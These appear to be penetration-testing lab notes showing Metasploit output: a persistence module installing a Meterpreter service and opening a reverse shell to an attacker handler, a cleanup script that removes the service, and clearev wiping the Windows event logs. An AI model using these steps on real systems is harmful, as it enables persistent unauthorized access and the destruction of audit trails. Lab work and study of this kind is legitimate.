# Windows

```bash
msf6 exploit(windows/local/persistence_service) > run

[*] Started reverse TCP handler on 10.10.22.4:4444 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\ZJrId.exe
[*] Creating service Tjgmhmf
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.5947/ATTACKDEFENSE_20240410.5947.rc
[*] Sending stage (175174 bytes) to 10.4.25.73
[*] Meterpreter session 2 opened (10.10.22.4:4444 -> 10.4.25.73:49795) at 2024-04-10 16:59:47 +0530
```

```bash
root@attackdefense:~# cat /root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.5947/ATTACKDEFENSE_20240410.5947.rc
execute -H -f sc.exe -a "stop Tjgmhmf"
execute -H -f sc.exe -a "delete Tjgmhmf"
execute -H -i -f taskkill.exe -a "/f /im ZJrId.exe"
rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\ZJrId.exe"
```

```bash
meterpreter > resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.0302/ATTACKDEFENSE_20240410.0302.rc
[*] Processing /root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.0302/ATTACKDEFENSE_20240410.0302.rc for ERB directives.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.0302/ATTACKDEFENSE_20240410.0302.rc)> execute -H -f sc.exe -a "stop FwAE"
Process 3984 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.0302/ATTACKDEFENSE_20240410.0302.rc)> execute -H -f sc.exe -a "delete FwAE"
Process 3088 created.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.0302/ATTACKDEFENSE_20240410.0302.rc)> execute -H -i -f taskkill.exe -a "/f /im uDOGXA.exe"
Process 2628 created.
Channel 5 created.
ERROR: Access is denied.
resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240410.0302/ATTACKDEFENSE_20240410.0302.rc)> rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\uDOGXA.exe"
[-] 1004: Operation failed: Access is denied.
```

Clearing the EventLog (probably not a good idea)

```bash
meterpreter > clearev 
[*] Wiping 166 records from Application...
[*] Wiping 792 records from System...
[*] Wiping 2586 records from Security...
meterpreter > 
```
